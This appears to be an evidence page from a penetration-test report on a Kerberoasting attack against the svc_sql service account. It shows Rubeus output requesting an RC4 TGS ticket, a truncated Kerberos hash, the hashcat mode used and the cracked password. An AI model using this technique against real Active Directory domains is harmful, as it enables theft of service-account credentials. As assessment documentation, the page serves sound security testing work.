# Evidence 04: Kerberoasting Execution & Ticket Extraction

**Target Identity:** `svc_sql` (`MSSQLSvc/APP01.corp.local:1433`)  
**Attack Vector:** Kerberos Ticket-Granting Service (TGS) Request with RC4 Encryption (`0x17`)  
**Assessment Tool:** Rubeus / PowerView Kerberos Module

---

## Terminal Verification Output

```
[*] Action: Ask TGS

[*] Target SPN: MSSQLSvc/APP01.corp.local:1433
[*] Format: hashcat
[*] Searching for SPN in Active Directory...
[+] Found SPN 'MSSQLSvc/APP01.corp.local:1433' linked to user 'svc_sql'
[*] Requesting TGS ticket for 'MSSQLSvc/APP01.corp.local:1433' ...
[+] Successfully received TGS ticket!
[*] Encryption Type: RC4-HMAC (0x17)
[*] Ticket Hash Extracted:

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/APP01.corp.local:1433*$A1B2C3D4...[TRUNCATED]...

[*] Offline Analysis:
    Target Hash Loaded into Hashcat (Mode 13100)
    Dictionary Match: "SqlServiceDatabasePassword!"
[+] Credentials Recovered: svc_sql : SqlServiceDatabasePassword!
```

---

## Screenshot Reference

![Kerberoasting Execution](04_kerberoast.png)
*(Screenshot: Rubeus terminal output requesting TGS ticket for svc_sql and recovering the service account password)*
